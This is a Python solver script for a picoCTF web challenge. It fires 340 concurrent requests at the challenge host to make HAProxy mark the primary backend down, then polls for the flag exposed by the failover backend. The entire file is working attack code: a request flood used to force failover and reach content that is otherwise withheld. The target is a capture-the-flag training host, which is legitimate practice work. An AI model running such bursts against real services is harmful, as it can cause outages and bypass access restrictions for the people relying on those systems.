#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser
from urllib.error import HTTPError, URLError
from urllib.request import Request, build_opener
import sys
import time


URL = "http://mysterious-sea.picoctf.net:54639"
TOTAL_BURST = 340
WORKERS = 40
POLL_ATTEMPTS = 20
POLL_DELAY = 1.0


class FlagParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.in_paragraph = False
        self.paragraphs = []

    def handle_starttag(self, tag, attrs):
        if tag == "p":
            self.in_paragraph = True

    def handle_endtag(self, tag):
        if tag == "p":
            self.in_paragraph = False

    def handle_data(self, data):
        if self.in_paragraph:
            text = data.strip()
            if text:
                self.paragraphs.append(text)


def fetch(opener):
    request = Request(URL, headers={"User-Agent": "picoctf-solver"})
    try:
        with opener.open(request, timeout=10) as response:
            status = response.status
            body = response.read().decode("utf-8", errors="replace")
            return status, body
    except HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        return exc.code, body
    except URLError as exc:
        return 0, str(exc)


def extract_flag_text(body):
    parser = FlagParser()
    parser.feed(body)
    for text in parser.paragraphs:
        if "picoCTF{" in text:
            return text
        if text != "No flag in this service":
            return text
    return None


def burst(opener):
    statuses = {}
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = [executor.submit(fetch, opener) for _ in range(TOTAL_BURST)]
        for future in as_completed(futures):
            status, _ = future.result()
            statuses[status] = statuses.get(status, 0) + 1
    return statuses


def main():
    opener = build_opener()

    print(f"[+] Bursting {TOTAL_BURST} requests against {URL}")
    statuses = burst(opener)
    print(f"[+] Burst status counts: {statuses}")

    print("[+] Waiting for HAProxy to mark the primary down")
    time.sleep(5)

    for attempt in range(1, POLL_ATTEMPTS + 1):
        status, body = fetch(opener)
        flag_text = extract_flag_text(body)
        print(f"[+] Poll {attempt}: HTTP {status}")
        if flag_text and "No flag in this service" not in flag_text:
            print(flag_text)
            return 0
        time.sleep(POLL_DELAY)

    print("[-] Flag not found. Try rerunning once the rate-limit window resets.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
